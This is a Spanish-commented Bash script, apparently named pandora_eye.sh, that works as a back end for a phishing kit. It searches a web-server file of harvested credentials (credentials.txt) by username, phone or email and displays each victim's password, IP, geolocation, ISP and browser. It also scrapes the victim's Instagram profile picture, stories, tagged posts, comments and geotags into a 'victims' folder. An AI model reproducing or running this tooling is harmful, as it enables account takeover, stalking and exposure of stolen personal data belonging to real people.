#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


# Funciones
colourMessages(){
  # Vars
  bracket="$1"; colour="$2"; message="$3"; unicolor="$4"

  # Condicionales
  if [ "$colour" == "green" ];then colour="\e[0;32m\033[1m"
  elif [ "$colour" == "red" ];then colour="\e[0;31m\033[1m"
  elif [ "$colour" == "blue" ];then colour="\e[0;34m\033[1m"
  elif [ "$colour" == "yellow" ];then colour="\e[0;33m\033[1m"
  elif [ "$colour" == "purple" ];then colour="\e[0;35m\033[1m"
  elif [ "$colour" == "turquoise" ];then colour="\e[0;36m\033[1m"
  elif [ "$colour" == "gray" ];then colour="\e[0;37m\033[1m"; fi
  if [ "$unicolor" == "t" ] || [ "$unicolor" == "y" ];then unicolor=$colour; fi

  # Creator
  echo -e "${colour}${bracket}${endColour}${grayColour}${unicolor} $message${endColour}${endColour}"
}


ctrl_c(){
  colourMessages "\n[!]" "red" "Saliendo...\n" "y"
  tput cnorm;exit 1
}


helpPanel(){
  colourMessages "\n[+]" "yellow" "Uso: ${greenColour}./pandora_eye.sh${endColour} ${purpleColour}[OPTIONS] [ARGUMENT]${endColour}\n" 
  colourMessages "\t-u)" "blue" "Filtrar por nombre usuario" 
  colourMessages "\t-t)" "blue" "Filtrar por número"
  colourMessages "\t-c)" "blue" "Filtrar por correo electrónico"
  colourMessages "\t-p)" "blue" "Filtrar por país"
  colourMessages "\t-m)" "blue" "Filtrar por móvil ${blueColour}(Ios,Android)${endColour}"
  colourMessages "\t-i)" "blue" "Filtrar por IP"
  colourMessages "\t-h)" "blue" "Mostrar panel de ayuda"
  colourMessages "\t-d)" "blue" "Descargar todos los recursos de instagram"
}


# Utilidades
separador_de_info(){
 
  # Variable locales
  user=$(cat /var/www/html/credentials.txt | grep -i "$2" -A 14 > user_tmp)  
  


  if [ "$1" == "usuario" ];then campo="Usuario: ";
  elif [ "$1" == "telefono" ];then campo="Teléfono: "
  elif [ "$1" == "correo" ];then campo="Correo: "
  elif [ "$1" == "contraseña" ];then campo="Contraseña: ";
  elif [ "$1" == "navegador" ];then campo="Navegador: ";
  elif [ "$1" == "ip" ];then campo="IP: ";
  elif [ "$1" == "region" ];then campo="Región: ";
  elif [ "$1" == "pais" ];then campo="Pais: ";
  elif [ "$1" == "ciudad" ];then campo="Ciudad: ";
  elif [ "$1" == "codigo_postal" ];then campo="Códgo_postal: ";
  elif [ "$1" == "latitud" ];then campo="Latitud: ";
  elif [ "$1" == "longitud" ];then campo="Longitud: ";  
  elif [ "$1" == "proveedor" ];then campo="Proveedor: ";
  elif [ "$1" == "compania" ];then campo="Compañia: ";
  elif [ "$1" == "fecha" ];then campo="Fecha: ";fi
    
  # Filtramos la info
  filtrador=$(cat user_tmp | grep "$campo" | sed "s/$campo//g")

  # Mostramos la info por pantalla
  echo -e "${purpleColour}$campo${endcolour}${grayColour}$filtrador${endcolour}"

  # Borramos el archivo temporal
  rm user_tmp
}

download_insta_picture(){
  # Movemos la imagen
  if [ -d victims/$usuario ];then
    kitty +kitten icat victims/$usuario/*profile_pic.jpg
  else
    # Descargamos la imagen
    python3 tools/instaloader/instaloader.py $usuario --no-posts --no-captions -q 2>/dev/null
    mv "$usuario" victims
    kitty +kitten icat victims/$usuario/*profile_pic.jpg
  fi
}

download_insta_posts(){
  # Validamos si esta descargado
  validate=$(ls -l victims/$usuario | wc -l)

  if [ "$interactive" == "true" ];then

    # BOrramos los archivos
    delete_resources

    echo -ne "\n${yellowColour}[+]${endColour}${grayColour} Descargar historias?[y/n]: " && read stories
    echo -ne "${yellowColour}[+]${endColour}${grayColour} Descargar lo más destacado?[y/n]: " && read highlights
    echo -ne "${yellowColour}[+]${endColour}${grayColour} Descargar publicaciones donde a sido etiquetado?[y/n]: " && read tagged
    echo -ne "${yellowColour}[+]${endColour}${grayColour} Descargar videos IGTV?[y/n]: " && read igtv
    echo -ne "${yellowColour}[+]${endColour}${grayColour} Descargar comentarios?[y/n]: " && read comments
    echo -ne "${yellowColour}[+]${endColour}${grayColour} Descargar etiquetas geograficas?[y/n]: " && read geotags

    # Añadimos a la query
    if [ "$stories" == "y" ];then stories="--stories"; else stories="";fi
    if [ "$highlights" == "y" ];then highlights="--highlights"; else highlights="";fi
    if [ "$tagged" == "y" ];then tagged="--tagged"; else tagged="";fi
    if [ "$igtv" == "y" ];then igtv="--igtv"; else igtv="";fi
    if [ "$comments" == "y" ];then comments="--comments"; else comments="";fi
    if [ "$geotags" == "y" ];then geotags="--geotags"; else geotags="";fi

    # Descargamos los recursos
    $(python3 tools/instaloader/instaloader.py $usuario --login=tuchotuchete $stories $highlights $tagged $igtv $comments $geotags -q)
    
    # Movemos los archivos
    mv "$usuario" victims

 elif [ $validate -le 4 ];then
    colourMessages "\n[>]" "green" "Descargando recursos..."
    python3 tools/instaloader/instaloader.py $usuario -q 2>/dev/null

    # Movemos los archivos descargados
    rm -r victims/$usuario
    mv "$usuario" victims

    colourMessages "\n[!]" "green" "Los recursos se an descargado correctamente ;)"
  else
    colourMessages "\n[!]" "red" "Los recursos ya están instalados" "t"
  fi
  }

delete_resources(){
    
    rm -r victims/$usuario 2>/dev/null 
}


# CTRL_C
trap ctrl_c INT


# Menu
while getopts "u:t:c:p:m:hadib" arg; do 
  case $arg in
    u) usuario=$OPTARG;;
    t) telefono=$OPTARG;;
    c) correo=$OPTARG;;
    p) pais=$OPTARG;;
    m) movil=$OPTARG;;
    i) interactive="true";;
    a) all="true";;
    d) descargar="true";;
    b) borrar="true";;
    h) helpPanel;;
  esac
done

if [ $usuario ];then
  download_insta_picture
  colourMessages "\n[+]" "yellow" "Mostrando información sobre: ${blueColour}$usuario${endcolour}\n"
  separador_de_info "usuario" "$usuario"
  separador_de_info "telefono" "$usuario"
  separador_de_info "correo" "$usuario"
  separador_de_info "contraseña" "$usuario"
  separador_de_info "navegador" "$usuario"
  separador_de_info "ip" "$usuario"
  separador_de_info "region" "$usuario"
  separador_de_info "pais" "$usuario"
  separador_de_info "ciudad" "$usuario"
  separador_de_info "codigo_postal" "$usuario"
  separador_de_info "latitud" "$usuario"
  separador_de_info "longitud" "$usuario"
  separador_de_info "proveedor" "$usuario"
  separador_de_info "compania" "$usuario"
  separador_de_info "fecha" "$usuario"
  if [ "$descargar" == "true" ];then
  download_insta_posts
 elif [ "$borrar" == "true" ];then
   delete_resources
  colourMessages "\n[!]" "red" "Datos de ${purpleColour}$usuario${endColour} borrados con éxito ;)"
  fi
elif [ $telefono ];then
  colourMessages "\n[+]" "yellow" "Mostrando información sobre: ${blueColour}$telefono${endcolour}\n"
  separador_de_info "usuario" "$telefono"
  separador_de_info "telefono" "$telefono"
  separador_de_info "correo" "$telefono"
  separador_de_info "contraseña" "$telefono"
  separador_de_info "navegador" "$telefono"
  separador_de_info "ip" "$telefono"
  separador_de_info "region" "$telefono"
  separador_de_info "pais" "$telefono"
  separador_de_info "ciudad" "$telefono"
  separador_de_info "codigo_postal" "$telefono"
  separador_de_info "latitud" "$telefono"
  separador_de_info "longitud" "$telefono"
  separador_de_info "proveedor" "$telefono"
  separador_de_info "compañia" "$telefono"
  separador_de_info "fecha" "$telefono"
elif [ $correo ];then
  colourMessages "\n[+]" "yellow" "Mostrando información sobre: ${blueColour}$correo${endcolour}\n"
  separador_de_info "usuario" "$correo"
  separador_de_info "telefono" "$correo"
  separador_de_info "correo" "$correo"
  separador_de_info "contraseña" "$correo"
  separador_de_info "navegador" "$correo"
  separador_de_info "ip" "$correo"
  separador_de_info "region" "$correo"
  separador_de_info "pais" "$correo"
  separador_de_info "ciudad" "$correo"
  separador_de_info "codigo_postal" "$correo"
  separador_de_info "latitud" "$correo"
  separador_de_info "longitud" "$correo"
  separador_de_info "proveedor" "$correo"
  separador_de_info "compañia" "$correo"
  separador_de_info "fecha" "$correo"
fi
